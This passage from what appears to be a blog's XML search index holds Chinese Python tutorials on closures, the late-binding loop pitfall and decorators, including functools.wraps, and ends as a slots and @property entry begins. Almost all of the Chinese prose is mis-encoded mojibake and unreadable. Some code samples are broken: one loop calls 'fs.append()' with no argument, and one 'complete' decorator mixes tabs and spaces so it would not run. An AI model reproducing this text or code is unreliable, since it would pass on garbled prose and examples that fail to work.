<p>é‚£ä¹ˆï¼Œé—­åŒ…åœ¨Pythonå†…éƒ¨åˆ°åº•æ˜¯æ€ä¹ˆå®ç°çš„å‘¢ï¼ŸPython ä¸­å‡½æ•°ä¹Ÿæ˜¯å¯¹è±¡ï¼Œæ‰€ä»¥å‡½æ•°ä¹Ÿæœ‰å¾ˆå¤šå±æ€§ï¼Œå’Œé—­åŒ…ç›¸å…³çš„å°±æ˜¯ <code>__closure__</code> å±æ€§ã€‚<code>__closure__</code> å±æ€§å®šä¹‰çš„æ˜¯ä¸€ä¸ªåŒ…å« cell å¯¹è±¡çš„å…ƒç»„ï¼Œå…¶ä¸­å…ƒç»„ä¸­çš„æ¯ä¸€ä¸ª cell å¯¹è±¡ç”¨æ¥ä¿å­˜ä½œç”¨åŸŸä¸­å˜é‡çš„å€¼ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>raised_to_4.__closure__</span><br><span class="line">(&lt;cell at <span class="number">0x000001A5E320DDC8</span>: int object at <span class="number">0x00007FF968E462F0</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>type(raised_to_4.__closure__)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">type</span>(<span class="params">raised_to_4.__closure__[<span class="number">0</span>]</span>)</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">cell</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">raised_to_4</span>.<span class="title">__closure__</span>[0].<span class="title">cell_contents</span></span></span><br><span class="line"><span class="class">4</span></span><br></pre></td></tr></table></figure>
<p>å°±å¦‚åˆšæ‰æ‰€è¯´ï¼Œåœ¨ <code>raised_to_4</code> çš„ <code>__closure__</code> å±æ€§ä¸­æœ‰å¤–éƒ¨å‡½æ•°å˜é‡ <code>n</code> çš„å¼•ç”¨ï¼Œé€šè¿‡å†…å­˜åœ°å€å¯ä»¥å‘ç°ï¼Œå¼•ç”¨çš„éƒ½æ˜¯åŒä¸€ä¸ª <code>n</code>ã€‚å¦‚æœæ²¡ç”¨å½¢æˆé—­åŒ…ï¼Œåˆ™ <code>__closure__</code> å±æ€§ä¸º <code>None</code>ã€‚</p>
<h2 id="Attention">Attention</h2>
<p>ä¸€ä¸ªéœ€è¦æ³¨æ„çš„é—®é¢˜æ˜¯ï¼Œè¿”å›çš„å‡½æ•°å¹¶æ²¡æœ‰ç«‹åˆ»æ‰§è¡Œï¼Œè€Œæ˜¯ç›´åˆ°è°ƒç”¨äº†<code>f()</code>æ‰æ‰§è¡Œã€‚æˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">f</span>():</span></span><br><span class="line">            <span class="keyword">return</span> i*i</span><br><span class="line">        fs.append()</span><br><span class="line">    <span class="keyword">return</span> fs</span><br><span class="line"></span><br><span class="line">f1, f2, f3 = count()</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæ¯æ¬¡å¾ªç¯ï¼Œéƒ½åˆ›å»ºäº†ä¸€ä¸ªæ–°çš„å‡½æ•°ï¼Œç„¶åï¼ŒæŠŠåˆ›å»ºçš„3ä¸ªå‡½æ•°éƒ½è¿”å›äº†ã€‚ä½ å¯èƒ½è®¤ä¸ºè°ƒç”¨<code>f1()</code>ï¼Œ<code>f2()</code>å’Œ<code>f3()</code>ç»“æœåº”è¯¥æ˜¯<code>1</code>ï¼Œ<code>4</code>ï¼Œ<code>9</code>ï¼Œä½†å®é™…ç»“æœæ˜¯ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>f1()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f2()</span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>f3()</span><br><span class="line"><span class="number">9</span></span><br></pre></td></tr></table></figure>
<p>å…¨éƒ¨éƒ½æ˜¯<code>9</code>ï¼åŸå› å°±åœ¨äºè¿”å›çš„å‡½æ•°å¼•ç”¨äº†å˜é‡<code>i</code>ï¼Œä½†å®ƒå¹¶éç«‹åˆ»æ‰§è¡Œã€‚ç­‰åˆ°3ä¸ªå‡½æ•°éƒ½è¿”å›æ—¶ï¼Œå®ƒä»¬æ‰€å¼•ç”¨çš„å˜é‡<code>i</code>å·²ç»å˜æˆäº†<code>3</code>ï¼Œå› æ­¤æœ€ç»ˆç»“æœä¸º<code>9</code>ã€‚</p>
<p><strong>è¿”å›é—­åŒ…æ—¶ç‰¢è®°ä¸€ç‚¹ï¼šè¿”å›å‡½æ•°ä¸è¦å¼•ç”¨ä»»ä½•å¾ªç¯å˜é‡ï¼Œæˆ–è€…åç»­ä¼šå‘ç”Ÿå˜åŒ–çš„å˜é‡ã€‚</strong></p>
<p>å¦‚æœä¸€å®šè¦å¼•ç”¨å¾ªç¯å˜é‡æ€ä¹ˆåŠï¼Ÿæ–¹æ³•æ˜¯å†åˆ›å»ºä¸€ä¸ªå‡½æ•°ï¼Œç”¨è¯¥å‡½æ•°çš„å‚æ•°ç»‘å®šå¾ªç¯å˜é‡å½“å‰çš„å€¼ï¼Œæ— è®ºè¯¥å¾ªç¯å˜é‡åç»­å¦‚ä½•æ›´æ”¹ï¼Œå·²ç»‘å®šåˆ°å‡½æ•°å‚æ•°çš„å€¼ä¸å˜ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">j</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">g</span>():</span></span><br><span class="line">            <span class="keyword">return</span> j*j</span><br><span class="line">        <span class="keyword">return</span> g</span><br><span class="line">    fs = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">4</span>):</span><br><span class="line">        fs.append(f(i)) <span class="comment"># f(i)ç«‹åˆ»è¢«æ‰§è¡Œï¼Œå› æ­¤içš„å½“å‰å€¼è¢«ä¼ å…¥f()</span></span><br><span class="line">    <span class="keyword">return</span> fs</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>å‡½æ•°å¼ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨</title>
    <url>/Python/code/4.Python%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B-%E8%A3%85%E9%A5%B0%E5%99%A8/</url>
    <content><![CDATA[<h1 id="Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨">Pythonå‡½æ•°å¼ç¼–ç¨‹-è£…é¥°å™¨</h1>
<p>æ¬è¿è‡ªhttps://foofish.net/python-decorator.html</p>
<p>åŸæ–‡æœ‰è‹¥å¹²å¤„é”™è¯¯ï¼</p>
<h2 id="å¼•å…¥">å¼•å…¥</h2>
<p>è£…é¥°å™¨æœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ª Python å‡½æ•°æˆ–ç±»ï¼Œå®ƒå¯ä»¥è®©å…¶ä»–å‡½æ•°æˆ–ç±»åœ¨ä¸éœ€è¦åšä»»ä½•ä»£ç ä¿®æ”¹çš„å‰æä¸‹å¢åŠ é¢å¤–åŠŸèƒ½ï¼Œè£…é¥°å™¨çš„è¿”å›å€¼ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°/ç±»å¯¹è±¡ã€‚</p>
<p>å®ƒç»å¸¸ç”¨äºæœ‰åˆ‡é¢éœ€æ±‚çš„åœºæ™¯ï¼Œæ¯”å¦‚ï¼šæ’å…¥æ—¥å¿—ã€æ€§èƒ½æµ‹è¯•ã€äº‹åŠ¡å¤„ç†ã€ç¼“å­˜ã€æƒé™æ ¡éªŒç­‰åœºæ™¯ï¼Œè£…é¥°å™¨æ˜¯è§£å†³è¿™ç±»é—®é¢˜çš„ç»ä½³è®¾è®¡ã€‚æœ‰äº†è£…é¥°å™¨ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠ½ç¦»å‡ºå¤§é‡ä¸å‡½æ•°åŠŸèƒ½æœ¬èº«æ— å…³çš„é›·åŒä»£ç åˆ°è£…é¥°å™¨ä¸­å¹¶ç»§ç»­é‡ç”¨ã€‚</p>
<p>æ¦‚æ‹¬çš„è®²ï¼Œè£…é¥°å™¨çš„ä½œç”¨å°±æ˜¯ä¸ºå·²ç»å­˜åœ¨çš„å¯¹è±¡æ·»åŠ é¢å¤–çš„åŠŸèƒ½ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸€æ­¥ä¸€æ­¥çš„æ¥çœ‹è£…é¥°å™¨æ˜¯æ€ä¹ˆå½¢æˆå’Œèµ·ä½œç”¨çš„ã€‚</p>
<p>å…ˆæ¥çœ‹ä¸€ä¸ªç®€å•å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>ç°åœ¨æœ‰ä¸€ä¸ªæ–°çš„éœ€æ±‚ï¼Œå¸Œæœ›å¯ä»¥è®°å½•ä¸‹å‡½æ•°çš„æ‰§è¡Œæ—¥å¿—ï¼Œäºæ˜¯åœ¨ä»£ç ä¸­æ·»åŠ æ—¥å¿—ä»£ç ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line">    logging.info(<span class="string">&#x27;foo is running&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>å‡è®¾ç°åœ¨å…¶ä»–å‡½æ•°ä¹Ÿæœ‰ç±»ä¼¼çš„éœ€æ±‚ï¼Œå¦‚æœå†å†™ä¸€ä¸ªloggingåœ¨å…¶ä»–å‡½æ•°é‡Œé¢ï¼Œè¿™æ ·å°±ä¼šé€ æˆå¤§é‡é‡å¤ä»£ç ã€‚é¦–å…ˆæƒ³åˆ°çš„è§£å†³åŠæ³•è‚¯å®šæ˜¯é‡æ–°å®šä¹‰ä¸€ä¸ªå‡½æ•°ä¸“é—¨æ¥å¤„ç†æ—¥å¿—ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">func</span>):</span></span><br><span class="line">    logging.warn(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    func()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">use_logging(foo)</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·åšé€»è¾‘ä¸Šæ˜¯æ²¡é—®é¢˜çš„ï¼ŒåŠŸèƒ½æ˜¯å®ç°äº†ï¼Œä½†æ˜¯æˆ‘ä»¬è°ƒç”¨çš„æ—¶å€™ä¸å†æ˜¯è°ƒç”¨çœŸæ­£çš„ä¸šåŠ¡é€»è¾‘<code>foo</code>å‡½æ•°ï¼Œè€Œæ˜¯æ¢æˆäº†<code>use_logging</code>å‡½æ•°ã€‚é‚£ä¹ˆæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹å¼çš„å‘¢ï¼Ÿå½“ç„¶æœ‰ï¼Œç­”æ¡ˆå°±æ˜¯è£…é¥°å™¨ã€‚</p>
<h2 id="ç®€å•è£…é¥°å™¨">ç®€å•è£…é¥°å™¨</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">func</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">		logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">		<span class="keyword">return</span> func() <span class="comment"># æŠŠfooå½“ä½œå‚æ•°ä¼ è¿›æ¥æ—¶ï¼Œæ‰§è¡Œfunc()å°±ç›¸å½“äºæ‰§è¡Œäº†foo()</span></span><br><span class="line">	<span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">	print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foo = use_logging(foo) <span class="comment"># å› ä¸ºè£…é¥°å™¨ use_logging(foo) è¿”å›çš„æ—¶å‡½æ•°å¯¹è±¡ wrapperï¼Œè¿™æ¡è¯­å¥ç›¸å½“äº  foo = wrapper</span></span><br><span class="line">foo() <span class="comment"># æ‰§è¡Œfoo()å°±ç›¸å½“äºæ‰§è¡Œ wrapper()</span></span><br></pre></td></tr></table></figure>
<p>use_logging å°±æ˜¯ä¸€ä¸ªè£…é¥°å™¨ï¼Œå®ƒä¸€ä¸ªæ™®é€šçš„å‡½æ•°ï¼Œå®ƒæŠŠæ‰§è¡ŒçœŸæ­£ä¸šåŠ¡é€»è¾‘çš„å‡½æ•° func åŒ…è£¹åœ¨å…¶ä¸­ï¼Œçœ‹èµ·æ¥åƒ foo è¢« use_logging è£…é¥°äº†ä¸€æ ·ï¼Œuse_logging è¿”å›çš„ä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„åå­—å« wrapperã€‚</p>
<h2 id="è¯­æ³•ç³–">è¯­æ³•ç³–</h2>
<p><code>@</code>ç¬¦å·å°±æ˜¯è£…é¥°å™¨çš„è¯­æ³•ç³–ï¼Œå®ƒæ”¾åœ¨å‡½æ•°å¼€å§‹å®šä¹‰çš„åœ°æ–¹ï¼Œè¿™æ ·å°±å¯ä»¥çœç•¥æœ€åä¸€æ­¥å†æ¬¡èµ‹å€¼çš„æ“ä½œã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">func</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>():</span></span><br><span class="line">		logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">		<span class="keyword">return</span> func()</span><br><span class="line">	<span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@use_logging</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">	print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#foo = use_logging(foo)</span></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure>
<p>å¦‚ä¸Šæ‰€ç¤ºï¼Œæœ‰äº† @ ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœå»<code>foo = use_logging(foo)</code>è¿™ä¸€å¥äº†ï¼Œç›´æ¥è°ƒç”¨ foo() å³å¯å¾—åˆ°æƒ³è¦çš„ç»“æœã€‚</p>
<h2 id="å¸¦å‚æ•°çš„foo">å¸¦å‚æ•°çš„foo()</h2>
<p>å¦‚æœä¸šåŠ¡é€»è¾‘å‡½æ•° foo éœ€è¦å‚æ•°ï¼Œä¾‹å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">name</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;I am %s&#x27;</span>, name)</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä»¬å¯ä»¥åœ¨å®šä¹‰ wrapper å‡½æ•°çš„æ—¶å€™æŒ‡å®šå‚æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">name</span>):</span></span><br><span class="line">    logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    <span class="keyword">return</span> func(name)</span><br></pre></td></tr></table></figure>
<p>è¿™æ · foo å‡½æ•°å®šä¹‰çš„å‚æ•°å°±å¯ä»¥å®šä¹‰åœ¨ wrapper å‡½æ•°ä¸­ã€‚å¦‚æœ<code>func</code>å‡½æ•°éœ€è¦è‹¥å¹²ä¸ªå‚æ•°çš„è¯ï¼Œå¯ä»¥ç”¨<code>*args</code>ä»£æ›¿ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args</span>):</span></span><br><span class="line">    logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    <span class="keyword">return</span> func(*args)</span><br></pre></td></tr></table></figure>
<p>å¦‚æœ foo å‡½æ•°è¿˜å®šä¹‰äº†ä¸€äº›å…³é”®å­—å‚æ•°å‘¢ï¼Ÿæ¯”å¦‚ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">name, age=None, height=None</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;I am %s, age %s, height %s&#x27;</span> % (name, age, height))</span><br></pre></td></tr></table></figure>
<p>è¿™æ—¶ï¼Œä½ å°±å¯ä»¥æŠŠ wrapper å‡½æ•°æŒ‡å®šå…³é”®å­—å‡½æ•°ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">    <span class="comment"># argsæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œkwargsä¸€ä¸ªå­—å…¸</span></span><br><span class="line">    logging.warn(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    <span class="keyword">return</span> func(*args, **kw)</span><br></pre></td></tr></table></figure>
<p>å®Œæ•´çš„å‡½æ•°å®šä¹‰å’Œè°ƒç”¨å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">func</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">    	logging.warn(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">    	<span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">	<span class="keyword">return</span> wrapper</span><br><span class="line"></span><br><span class="line"><span class="meta">@use_logging</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">	print(<span class="string">&#x27;I am foo&#x27;</span>)</span><br><span class="line"></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure>
<h2 id="å¸¦å‚æ•°çš„è£…é¥°å™¨">å¸¦å‚æ•°çš„è£…é¥°å™¨</h2>
<p>è£…é¥°å™¨çš„è¯­æ³•å…è®¸æˆ‘ä»¬åœ¨è°ƒç”¨æ—¶ï¼Œæä¾›å…¶å®ƒå‚æ•°ï¼Œæ¯”å¦‚<code>@decorator(a)</code>ã€‚è¿™æ ·ï¼Œå°±ä¸ºè£…é¥°å™¨çš„ç¼–å†™å’Œä½¿ç”¨æä¾›äº†æ›´å¤§çš„çµæ´»æ€§ã€‚æ¯”å¦‚ï¼šæˆ‘ä»¬å¯ä»¥åœ¨è£…é¥°å™¨ä¸­æŒ‡å®šæ—¥å¿—çš„ç­‰çº§ï¼Œå› ä¸ºä¸åŒä¸šåŠ¡å‡½æ•°å¯èƒ½éœ€è¦çš„æ—¥å¿—çº§åˆ«æ˜¯ä¸ä¸€æ ·çš„ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">use_logging</span>(<span class="params">level</span>):</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line">		<span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">			<span class="keyword">if</span> level == <span class="string">&#x27;warn&#x27;</span>:</span><br><span class="line">				logging.warning(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">			<span class="keyword">elif</span> level == <span class="string">&#x27;error&#x27;</span>:</span><br><span class="line">				logging.error(<span class="string">&quot;%s is running&quot;</span> % func.__name__)</span><br><span class="line">			<span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">		<span class="keyword">return</span> wrapper</span><br><span class="line">	<span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@use_logging(level=&#x27;error&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>(<span class="params">name, age</span>):</span></span><br><span class="line">	print(<span class="string">&#x27;I am %s, %s age&#x27;</span> % (name, age))</span><br><span class="line"></span><br><span class="line">foo(<span class="string">&#x27;foo&#x27;</span>, <span class="number">19</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„<code>use_logging</code>æ˜¯å…è®¸å¸¦å‚æ•°çš„è£…é¥°å™¨ã€‚å®ƒå®é™…ä¸Šæ˜¯å¯¹åŸæœ‰è£…é¥°å™¨çš„ä¸€ä¸ªå‡½æ•°å°è£…ï¼Œå¹¶è¿”å›ä¸€ä¸ªè£…é¥°å™¨ã€‚æˆ‘ä»¬å¯ä»¥å°†å®ƒç†è§£ä¸ºä¸€ä¸ªå«æœ‰å‚æ•°çš„é—­åŒ…ã€‚</p>
<p>å…·ä½“è€Œè¨€ï¼Œå’Œä¸¤å±‚åµŒå¥—çš„decoratorç›¸æ¯”ï¼Œ3å±‚åµŒå¥—çš„æ•ˆæœæ˜¯è¿™æ ·çš„ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>foo = use_logging(<span class="string">&#x27;error&#x27;</span>)(foo)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é¦–å…ˆæ‰§è¡Œ<code>use_logging('error')</code>è¿”å›çš„æ˜¯<code>decorator</code>ï¼Œå†è°ƒç”¨è¿”å›çš„å‡½æ•°ï¼Œå‚æ•°æ˜¯<code>foo</code>ï¼Œå³<code>decorator(foo)</code>ï¼Œè¿”å›çš„æœ€ç»ˆæ˜¯<code>wrapper</code>å‡½æ•°ã€‚</p>
<p><code>@use_logging(level=&quot;warn&quot;)</code>ç­‰ä»·äº<code>@decorator</code></p>
<h2 id="functools-wraps">functools.wraps</h2>
<p>ä½¿ç”¨è£…é¥°å™¨æå¤§åœ°å¤ç”¨äº†ä»£ç ï¼Œä½†æ˜¯ä»–æœ‰ä¸€ä¸ªç¼ºç‚¹å°±æ˜¯åŸå‡½æ•°çš„å…ƒä¿¡æ¯ä¸è§äº†ï¼Œæ¯”å¦‚å‡½æ•°çš„<code>docstring</code>ã€<code>__name__</code>ã€å‚æ•°åˆ—è¡¨ï¼Œå…ˆçœ‹ä¾‹å­ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">            print(<span class="string">&#x27;%s %s():&#x27;</span> % (text, func.__name__))</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@log(&#x27;execute&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;2015-3-25&#x27;</span>)</span><br><span class="line"></span><br><span class="line">now()</span><br><span class="line">print(now.__name__)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">execute now():</span><br><span class="line"><span class="number">2015</span><span class="number">-3</span><span class="number">-25</span></span><br><span class="line"><span class="string">&#x27;wrapper&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å› ä¸ºè¿”å›çš„é‚£ä¸ª<code>wrapper()</code>å‡½æ•°åå­—å°±æ˜¯<code>'wrapper'</code>ï¼Œæ‰€ä»¥ï¼Œéœ€è¦æŠŠåŸå§‹å‡½æ•°çš„<code>__name__</code>ç­‰å±æ€§å¤åˆ¶åˆ°<code>wrapper()</code>å‡½æ•°ä¸­ï¼Œå¦åˆ™ï¼Œæœ‰äº›ä¾èµ–å‡½æ•°ç­¾åçš„ä»£ç æ‰§è¡Œå°±ä¼šå‡ºé”™ã€‚</p>
<p>å¯ä»¥ç›´æ¥ä½¿ç”¨Pythonå†…ç½®çš„<code>functools.wraps</code>å‡½æ•°è§£å†³ä¸Šè¿°é—®é¢˜ã€‚ä¸€ä¸ªå®Œæ•´çš„decoratorå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">func</span>):</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">        print(<span class="string">&#x27;call %s():&#x27;</span> % func.__name__)</span><br><span class="line">        <span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>é’ˆå¯¹å¸¦å‚æ•°çš„è£…é¥°å™¨ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span>(<span class="params">text</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span>(<span class="params">func</span>):</span></span><br><span class="line"><span class="meta">        @functools.wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span>(<span class="params">*args, **kw</span>):</span></span><br><span class="line">            print(<span class="string">&#x27;%s %s():&#x27;</span> % (text, func.__name__))</span><br><span class="line">            <span class="keyword">return</span> func(*args, **kw)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>ç¼–ç¨‹</category>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>å‡½æ•°å¼ç¼–ç¨‹</tag>
      </tags>
  </entry>
  <entry>
    <title>Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€@propertyå’Œå¤šé‡ç»§æ‰¿</title>
    <url>/Python/code/5.Python%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E9%AB%98%E7%BA%A7%E7%BC%96%E7%A8%8B%E4%B9%8Bslots%E3%80%81@property%E5%92%8C%E5%A4%9A%E9%87%8D%E7%BB%A7%E6%89%BF/</url>
    <content><![CDATA[<h1 id="Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€-propertyå’Œå¤šé‡ç»§æ‰¿">Pythoné¢å‘å¯¹è±¡é«˜çº§ç¼–ç¨‹ä¹‹slotsã€@propertyå’Œå¤šé‡ç»§æ‰¿</h1>
